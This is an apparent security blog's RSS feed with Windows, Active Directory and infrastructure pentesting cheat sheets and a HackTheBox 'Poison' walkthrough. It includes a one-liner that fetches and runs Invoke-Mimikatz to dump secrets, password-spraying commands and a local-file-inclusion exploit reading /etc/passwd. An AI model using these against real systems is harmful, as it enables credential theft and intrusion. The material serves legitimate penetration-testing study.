@@ -1,0 +1,663 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Dank &#8211; \x44\x61\x6e\x6b</title>
+	<atom:link href="/author/dank/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>Dank adventures in security</description>
+	<lastBuildDate>Mon, 27 Mar 2023 05:25:56 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.1.1</generator>
+	<item>
+		<title>Cheatsheet &#8211; Microsoft Windows Pentesting</title>
+		<link>/2021/07/19/cheatsheet-microsoft-windows/</link>
+					<comments>/2021/07/19/cheatsheet-microsoft-windows/#respond</comments>
+		
+		<dc:creator><![CDATA[Dank]]></dc:creator>
+		<pubDate>Mon, 19 Jul 2021 10:26:38 +0000</pubDate>
+				<category><![CDATA[Cheat Sheet]]></category>
+		<category><![CDATA[Windows]]></category>
+		<category><![CDATA[cheatsheet]]></category>
+		<category><![CDATA[microsoft]]></category>
+		<category><![CDATA[windows]]></category>
+		<guid isPermaLink="false">/blog/?p=71</guid>
+
+					<description><![CDATA[A living cheatsheet of commands and tips i've encountered during my day to day which are good enough to share :)]]></description>
+										<content:encoded><![CDATA[
+<p class="has-large-font-size"><strong>Random Notes:</strong></p>
+
+
+
+<ul>
+<li>Testing for CLM: </li>
+</ul>
+
+
+
+<pre class="wp-block-preformatted">$ExecutionContext.SessionState.LanguageMode</pre>
+
+
+
+<ul>
+<li>Enable RDP &#038; Firewall:
+<ul>
+<li>reg add &#8220;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#8221; /v fDenyTSConnections /t REG_DWORD /d 0 /f</li>
+
+
+
+<li>netsh firewall set service type = remotedesktop mode = enable</li>
+</ul>
+</li>
+</ul>
+
+
+
+<p class="has-large-font-size"><strong>Local Privilege Escalation:</strong></p>
+
+
+
+<p>Cheatsheet Resources:</p>
+
+
+
+<ul>
+<li>https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</li>
+</ul>
+
+
+
+<p class="has-large-font-size"><strong>Dumping Credentials:</strong></p>
+
+
+
+<p>Bypassing PPL:</p>
+
+
+
+<ul>
+<li>https://github.com/itm4n/PPLdump</li>
+
+
+
+<li>https://github.com/RedCursorSecurityConsulting/PPLKiller</li>
+</ul>
+
+
+
+<p>Dump LSASS bypassing AV/EDR</p>
+
+
+
+<ul>
+<li>https://github.com/outflanknl/Dumpert</li>
+</ul>
+
+
+
+<p>Mimikatz:</p>
+
+
+
+<ul>
+<li>https://hunter2.gitbook.io/darthsidious/privilege-escalation/mimikatz
+<ul>
+<li>iex (New-Object Net.Webclient).DownloadString(&#8220;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1&#8221;)</li>
+
+
+
+<li>Invoke-Mimikatz -Command &#8216;&#8221;token::elevate&#8221; &#8220;lsadump::secrets&#8221;&#8216;</li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+					
+					<wfw:commentRss>/2021/07/19/cheatsheet-microsoft-windows/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Cheatsheet &#8211; Active Directory Pentesting</title>
+		<link>/2021/07/19/cheatsheet-active-directory-pentesting/</link>
+					<comments>/2021/07/19/cheatsheet-active-directory-pentesting/#respond</comments>
+		
+		<dc:creator><![CDATA[Dank]]></dc:creator>
+		<pubDate>Mon, 19 Jul 2021 10:24:02 +0000</pubDate>
+				<category><![CDATA[Active Directory]]></category>
+		<category><![CDATA[Cheat Sheet]]></category>
+		<category><![CDATA[active directory]]></category>
+		<category><![CDATA[cheatsheet]]></category>
+		<guid isPermaLink="false">/blog/?p=53</guid>
+
+					<description><![CDATA[A living cheatsheet of commands and tips i've encountered during my day to day which are good enough to share :)]]></description>
+										<content:encoded><![CDATA[
+<p class="has-large-font-size"><strong>Top cheat sheet resources:</strong></p>
+
+
+
+<ul><li>https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</li><li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md</li><li>https://book.hacktricks.xyz/windows/active-directory-methodology</li><li>https://github.com/infosecn1nja/AD-Attack-Defense</li><li>https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</li></ul>
+
+
+
+<p class="has-large-font-size"><strong>ACL/ACE Abuse Resources:</strong></p>
+
+
+
+<ul><li>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</li></ul>
+
+
+
+<p class="has-large-font-size"><strong>To Review:</strong></p>
+
+
+
+<ul><li>http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</li><li>https://adsecurity.org/?p=2011</li><li>https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#unconstrained-delegation</li><li>https://sixdub.medium.com/derivative-local-admin-cdd09445aac8</li><li>https://exploit.ph/powerview.html</li><li>https://exploit.ph/user-constrained-delegation.html</li><li>https://exploit.ph/revisiting-delegate-2-thyself.html</li><li>https://swarm.ptsecurity.com/kerberoasting-without-spns/</li><li>https://www.aisp.sg/document/CRESTConSpeaker/Delegate_or_Escalate.pdf</li></ul>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/2021/07/19/cheatsheet-active-directory-pentesting/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Cheatsheet &#8211; Internal Infrastructure Pentesting</title>
+		<link>/2021/07/19/cheatsheet-internal-infrastructure-pentesting/</link>
+					<comments>/2021/07/19/cheatsheet-internal-infrastructure-pentesting/#respond</comments>
+		
+		<dc:creator><![CDATA[Dank]]></dc:creator>
+		<pubDate>Mon, 19 Jul 2021 10:20:27 +0000</pubDate>
+				<category><![CDATA[Cheat Sheet]]></category>
+		<category><![CDATA[Infrastructure]]></category>
+		<category><![CDATA[cheatsheet]]></category>
+		<category><![CDATA[infrastructure]]></category>
+		<guid isPermaLink="false">/blog/?p=57</guid>
+
+					<description><![CDATA[A living cheatsheet of commands and tips i've encountered during my day to day which are good enough to share :)]]></description>
+										<content:encoded><![CDATA[
+<p class="has-large-font-size"><strong>Unauthenticated Vectors:</strong></p>
+
+
+
+<p>Password Spraying:</p>
+
+
+
+<ul><li>https://book.hacktricks.xyz/windows/active-directory-methodology/password-spraying</li><li>https://github.com/Greenwolf/Spray</li><li>MSF: use auxiliary/scanner/smb/smb_login</li><li>CrackMapExec: crackmapexec cmd &lt;targetfile&gt; -u user -p pass -d domain</li></ul>
+
+
+
+<p>Relaying Credentials with ntlmrelayx:</p>
+
+
+
+<ul><li>https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/</li></ul>
+
+
+
+<p class="has-large-font-size"><strong>Authenticated Vectors:</strong></p>
+
+
+
+<p>Start CMD with secondary user credentials:</p>
+
+
+
+<ul><li>Local: runas /netonly /user:&lt;username&gt; cmd.exe</li><li>Domain: runas /netonly /user:&lt;domain&gt;\&lt;username&gt; cmd.exe</li></ul>
+
+
+
+<p>Log into System:</p>
+
+
+
+<ul><li>winrs -r:&lt;computername> cmd.exe</li><li>Enter-PSSession -ComputerName &lt;computername></li></ul>
+
+
+
+<p>Enable PowerShell Remoting</p>
+
+
+
+<ul><li>Enable: Enable-PSRemoting –force</li><li>Check WinRM Running: Get-WmiObject &#8211;<strong>Class</strong> win32_service | Where-Object {$_.name -like &#8220;WinRM&#8221;}</li><li>Set  all remote hosts to trusted: Set-Item WSMan:localhost\client\trustedhosts -value *<ul><li>Verify Configuration: Get-Item WSMan:\localhost\Client\TrustedHosts</li></ul></li></ul>
+
+
+
+<p class="has-large-font-size"><strong>Windows Activities:</strong></p>
+
+
+
+<p>See: /index.php/2021/07/19/cheatsheet-microsoft-windows/</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/2021/07/19/cheatsheet-internal-infrastructure-pentesting/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Cheatsheet &#8211; PowerShell Pentesting</title>
+		<link>/2021/07/19/cheatsheet-powershell-pentesting/</link>
+					<comments>/2021/07/19/cheatsheet-powershell-pentesting/#respond</comments>
+		
+		<dc:creator><![CDATA[Dank]]></dc:creator>
+		<pubDate>Mon, 19 Jul 2021 10:10:54 +0000</pubDate>
+				<category><![CDATA[Cheat Sheet]]></category>
+		<category><![CDATA[cheatsheet]]></category>
+		<category><![CDATA[powershell]]></category>
+		<guid isPermaLink="false">/blog/?p=59</guid>
+
+					<description><![CDATA[A living cheatsheet of commands and tips i've encountered during my day to day which are good enough to share :)]]></description>
+										<content:encoded><![CDATA[
+<p>Creating PSCredential Objects</p>
+
+
+
+<pre class="wp-block-code"><code># username and password
+$userName = '<strong>user</strong>'
+$userPassword = '<strong>pass</strong>'
+
+# Convert passwird to SecureString
+$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
+
+# Create PSCredential Object
+$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)</code></pre>
+
+
+
+<p>Oneliner</p>
+
+
+
+<pre class="wp-block-code"><code>$credObject = New-Object System.Management.Automation.PSCredential ('<strong>username</strong>', (ConvertTo-SecureString '<strong>password</strong>' -AsPlainText -Force))</code></pre>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/2021/07/19/cheatsheet-powershell-pentesting/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>HackTheBox &#8211; Poison</title>
+		<link>/2021/01/22/hackthebox-poison/</link>
+					<comments>/2021/01/22/hackthebox-poison/#respond</comments>
+		
+		<dc:creator><![CDATA[Dank]]></dc:creator>
+		<pubDate>Fri, 22 Jan 2021 11:59:46 +0000</pubDate>
+				<category><![CDATA[Hack The Box]]></category>
+		<category><![CDATA[hackthebox]]></category>
+		<category><![CDATA[htb]]></category>
+		<category><![CDATA[lfi]]></category>
+		<category><![CDATA[poison]]></category>
+		<category><![CDATA[vnc password decrypt]]></category>
+		<guid isPermaLink="false">/blog/?p=35</guid>
+
+					<description><![CDATA[An medium rated (4/10) HackTheBox host. Initial access into the host is quite trivial, whereas some decent host enumeration is required for privilege escalation.]]></description>
+										<content:encoded><![CDATA[<div class="wp-block-image">
+<figure class="aligncenter size-large"><img decoding="async" width="570" height="315" src="/wp-content/uploads/2021/01/image.png" alt="" class="wp-image-36" srcset="/wp-content/uploads/2021/01/image.png 570w, /wp-content/uploads/2021/01/image-300x166.png 300w" sizes="(max-width: 570px) 100vw, 570px" /></figure></div>
+
+
+<p>An medium rated (4/10) HackTheBox host. Initial access into the host is quite trivial, whereas some decent host enumeration is required for privilege escalation.</p>
+
+
+
+<h2>Enumeration</h2>
+
+
+
+<pre class="wp-block-code"><code>$ <strong>nmap -vvv $IP -sV -O -Pn -oA nmap/default</strong>
+
+Nmap scan report for 10-10-10-84.tpgi.com.au (10.10.10.84)
+Host is up, received user-set (0.0074s latency).
+Scanned at 2021-01-22 20:11:10 AEDT for 24s
+Not shown: 998 closed ports
+Reason: 998 resets
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)</code></pre>
+
+
+
+<h2>Initial Access</h2>
+
+
+
+<p>Targeting the web application:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><img decoding="async" width="811" height="191" src="/wp-content/uploads/2021/01/image-1.png" alt="" class="wp-image-37" srcset="/wp-content/uploads/2021/01/image-1.png 811w, /wp-content/uploads/2021/01/image-1-300x71.png 300w, /wp-content/uploads/2021/01/image-1-768x181.png 768w" sizes="(max-width: 811px) 100vw, 811px" /></figure></div>
+
+
+<p>Submitting the &#8216;listfiles.php&#8217; file as the script name will request the following page:</p>
+
+
+
+<ul>
+<li>http://10.10.10.84/browse.php?file=listfiles.php</li>
+</ul>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><img decoding="async" width="943" height="91" src="/wp-content/uploads/2021/01/image-2.png" alt="" class="wp-image-38" srcset="/wp-content/uploads/2021/01/image-2.png 943w, /wp-content/uploads/2021/01/image-2-300x29.png 300w, /wp-content/uploads/2021/01/image-2-768x74.png 768w" sizes="(max-width: 943px) 100vw, 943px" /></figure></div>
+
+
+<p>The GET parameter &#8216;file&#8217; is vulnerable to a Local File Injection vulnerability, requesting the &#8216;pwdbackup.txt&#8217; file within the &#8216;file&#8217; GET parameter returns an encoded message:</p>
+
+
+
+<ul>
+<li>http://10.10.10.84/browse.php?file=pwdbackup.txt</li>
+</ul>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><img decoding="async" width="903" height="367" src="/wp-content/uploads/2021/01/image-3.png" alt="" class="wp-image-39" srcset="/wp-content/uploads/2021/01/image-3.png 903w, /wp-content/uploads/2021/01/image-3-300x122.png 300w, /wp-content/uploads/2021/01/image-3-768x312.png 768w" sizes="(max-width: 903px) 100vw, 903px" /></figure></div>
+
+
+<p>This appears to be a string which has been continuously base64 encoded (also hinted at in the first line message). We can continually remove newlines and decode the string on the terminal via &#8216;echo &#8220;&lt;message&gt;&#8221; | tr -d &#8216;\n&#8217; | base64 -d&#8217;. Doing this eventually discloses a password:</p>
+
+
+
+<pre class="wp-block-code"><code>echo 'Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=' | tr -d ' ' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n' | base64 -d | tr -d '\n'</code></pre>
+
+
+
+<p>This discloses the password: <strong>Charix!2#4%6&amp;8(0</strong></p>
+
+
+
+<p>Requesting the /etc/passwd file will show usernames which the password could potentially belong to:</p>
+
+
+
+<ul>
+<li>http://10.10.10.84/browse.php?file=/etc/passwd</li>
+</ul>
+
+
+
+<p>HTTP Request returned:</p>
+
+
+
+<pre class="wp-block-code"><code>HTTP/1.1 200 OK
+
+Date: Fri, 22 Jan 2021 10:21:29 GMT
+
+Server: Apache/2.4.29 (FreeBSD) PHP/5.6.32
+
+X-Powered-By: PHP/5.6.32
+
+Content-Length: 1894
+
+Connection: close
+
+Content-Type: text/html; charset=UTF-8
+
+
+
+# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
+#
+root:*:0:0:Charlie &amp;:/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:
+daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
+operator:*:2:5:System &amp;:/:/usr/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
+tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
+kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
+games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
+news:*:8:8:News Subsystem:/:/usr/sbin/nologin
+man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
+sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
+smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
+mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
+bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
+unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
+proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
+_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
+_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
+uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
+pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
+auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
+www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
+_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
+hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
+nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
+_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
+messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
+avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
+cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
+charix:*:1001:1001:charix:/home/charix:/bin/csh</code></pre>
+
+
+
+<p>The &#8216;charix&#8217; user seems to be a good target</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><img decoding="async" width="619" height="427" src="/wp-content/uploads/2021/01/image-9.png" alt="" class="wp-image-45" srcset="/wp-content/uploads/2021/01/image-9.png 619w, /wp-content/uploads/2021/01/image-9-300x207.png 300w" sizes="(max-width: 619px) 100vw, 619px" /></figure></div>
+
+
+<p>&nbsp;</p>
+
+
+
+<h2>Privilege Escalation</h2>
+
+
+
+<p>The charix user contians a &#8216;secret.zip&#8217; file within their home directory. The zip file requires a password to unzip however:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><img decoding="async" width="332" height="66" src="/wp-content/uploads/2021/01/image-5.png" alt="" class="wp-image-41" srcset="/wp-content/uploads/2021/01/image-5.png 332w, /wp-content/uploads/2021/01/image-5-300x60.png 300w" sizes="(max-width: 332px) 100vw, 332px" /></figure></div>
+
+
+<p>The zip utility on the host itself did not appear to support passwords, copying the zip file to a local machine and unziping with the charix user&#8217;s password worked!</p>
+
+
+
+<p>Displaying the contents of the file extracted from the zip file appeared to be random data:</p>
+
+
+
+<pre class="wp-block-code"><code>$ xxd secret
+00000000: bda8 5b7c d596 7a21                      ..&#91;|..z!</code></pre>
+
+
+
+<p>Further enumeration on the host shows that there is a local service running:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><img decoding="async" width="625" height="193" src="/wp-content/uploads/2021/01/image-6.png" alt="" class="wp-image-42" srcset="/wp-content/uploads/2021/01/image-6.png 625w, /wp-content/uploads/2021/01/image-6-300x93.png 300w" sizes="(max-width: 625px) 100vw, 625px" /></figure></div>
+
+
+<p>Port 5801 &amp; 5901 are well known ports for the VNC service.</p>
+
+
+
+<p>Researching VNC exploits reveals that it is possible to decrypt VNC password files:</p>
+
+
+
+<ul>
+<li>https://book.hacktricks.xyz/pentesting/pentesting-vnc</li>
+</ul>
+
+
+
+<p>Cloning the following repository:</p>
+
+
+
+<ul>
+<li>https://github.com/jeroennijhof/vncpwd</li>
+</ul>
+
+
+
+<p>Running:</p>
+
+
+
+<pre class="wp-block-code"><code>cd vncpwd
+make
+vncpwd ../secret</code></pre>
+
+
+
+<p>Outputs the following decrypted VNC password:</p>
+
+
+
+<ul>
+<li>Password: VNCP@$$!</li>
+</ul>
+
+
+
+<p>Connecting to the localhost VNC Server:</p>
+
+
+
+<p>The following command will setup a SSH tunnel with the local port 5901, to the &#8216;remote&#8217; local port 5091</p>
+
+
+
+<pre class="wp-block-code"><code>ssh charix@10.10.10.84 -L 5901:127.0.0.1:5901</code></pre>
+
+
+
+<p>Once the SSH tunnel has been established, we can connect to the remote VNC Server via our local port 5901, which is being forwarded to the remote hosts local 5901 port:</p>
+
+
+
+<pre class="wp-block-code"><code>vncviewer 127.0.0.1:5901</code></pre>
+
+
+
+<p>When asked for the password we can supply the decrypted VNC password:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><img decoding="async" width="598" height="241" src="/wp-content/uploads/2021/01/image-7.png" alt="" class="wp-image-43" srcset="/wp-content/uploads/2021/01/image-7.png 598w, /wp-content/uploads/2021/01/image-7-300x121.png 300w" sizes="(max-width: 598px) 100vw, 598px" /></figure></div>
+
+
+<p>The VNC Server process is running as root, thus giving us a root session to the server:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><img decoding="async" width="719" height="189" src="/wp-content/uploads/2021/01/image-8.png" alt="" class="wp-image-44" srcset="/wp-content/uploads/2021/01/image-8.png 719w, /wp-content/uploads/2021/01/image-8-300x79.png 300w" sizes="(max-width: 719px) 100vw, 719px" /></figure></div>]]></content:encoded>
+					
+					<wfw:commentRss>/2021/01/22/hackthebox-poison/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Cheatsheet &#8211; Wireless Security</title>
+		<link>/2020/12/03/wireless-security-cheat-sheet/</link>
+					<comments>/2020/12/03/wireless-security-cheat-sheet/#respond</comments>
+		
+		<dc:creator><![CDATA[Dank]]></dc:creator>
+		<pubDate>Thu, 03 Dec 2020 23:16:25 +0000</pubDate>
+				<category><![CDATA[Cheat Sheet]]></category>
+		<category><![CDATA[Wireless Security]]></category>
+		<category><![CDATA[cheat sheet]]></category>
+		<category><![CDATA[EAP]]></category>
+		<category><![CDATA[Enterprise]]></category>
+		<category><![CDATA[wireless security]]></category>
+		<guid isPermaLink="false">/blog/?p=25</guid>
+
+					<description><![CDATA[A living cheat sheet of wireless information]]></description>
+										<content:encoded><![CDATA[
+<p><strong>Personal Networks</strong>:</p>
+
+
+
+<ul>
+<li>Typical WEP &amp; WPA is bad, WPA2 is good</li>
+</ul>
+
+
+
+<p><strong>Enterprise Networks</strong>:</p>
+
+
+
+<p>Overview of Enterprise security, WPA modes, Enterprise network architecture and deployment guide:</p>
+
+
+
+<ul>
+<li><a href="/a-crash-course-into-wpa-enterprise-security-and-deployment" target="_blank" rel="noreferrer noopener">/a-crash-course-into-wpa-enterprise-security-and-deployment</a></li>
+</ul>
+
+
+
+<p>Whitepaper on attacking and defending Enterprise networks:</p>
+
+
+
+<ul>
+<li>Whitepaper overview: <a href="/attacking-and-defending-wpa-enterprise-networks" target="_blank" rel="noreferrer noopener">/</a><a rel="noreferrer noopener" href="/index.php/archive/attacking-and-defending-wpa-enterprise-networks" target="_blank">/attacking-and-defending-wpa-enterprise-networks</a></li>
+</ul>
+
+
+
+<ul>
+<li>Whitepaper full pdf: <a href="/attacking-and-defending-wpa-enterprise-networks/attacking-and-defending-wpa-enterprise-networks.pdf">/attacking-and-defending-wpa-enterprise-networks/attacking-and-defending-wpa-enterprise-networks.pdf</a></li>
+</ul>
+
+
+
+<p>EAP Method Compatability Tables (Taken from blog post)</p>
+
+
+
+<ul>
+<li><strong>Tunnelled EAP Methods</strong></li>
+</ul>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" width="525" height="422" src="/wp-content/uploads/2022/07/Tunnelled-EAP-Methods.png" alt="" class="wp-image-92" srcset="/wp-content/uploads/2022/07/Tunnelled-EAP-Methods.png 525w, /wp-content/uploads/2022/07/Tunnelled-EAP-Methods-300x241.png 300w" sizes="(max-width: 525px) 100vw, 525px" /></figure>
+
+
+
+<ul>
+<li><strong>Native EAP Methods</strong></li>
+</ul>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" width="522" height="268" src="/wp-content/uploads/2022/07/Native-EAP-Methods.png" alt="" class="wp-image-93" srcset="/wp-content/uploads/2022/07/Native-EAP-Methods.png 522w, /wp-content/uploads/2022/07/Native-EAP-Methods-300x154.png 300w" sizes="(max-width: 522px) 100vw, 522px" /></figure>
+]]></content:encoded>
+					
+					<wfw:commentRss>/2020/12/03/wireless-security-cheat-sheet/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
